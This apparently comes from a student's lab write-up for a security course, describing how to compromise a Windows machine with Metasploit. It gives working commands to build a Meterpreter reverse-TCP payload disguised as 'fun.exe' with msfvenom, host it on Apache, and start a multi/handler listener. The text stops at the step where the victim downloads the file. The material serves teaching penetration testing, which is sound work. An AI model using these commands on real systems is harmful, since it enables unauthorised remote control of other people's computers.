# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Name : Mohammed ibrahim 
### Reg No : 212223100034

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:

![if-config](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d81c29e7-4cb2-4989-a4f0-32d0f4dcffa5)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
![msfvenom](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a8e477e7-1f5b-4831-a003-ffc199679313)

copy the fun.exe into the apache /var/www/html folder

![cpfunexe](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/edc15bf9-0646-4d77-a7b2-7fbe6adae449)

Start apache server
sudo systemctl apache2 start

![startapache2](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/f2bdb40b-22b8-409e-8295-7cac780eab89)

Check the status of apache2

![status](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d5dca89e-d102-408d-aa25-d60e7e09ff2b)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

![usemultihandler](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/31c4d664-f12a-45a9-aa29-e988f03e88e1)

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
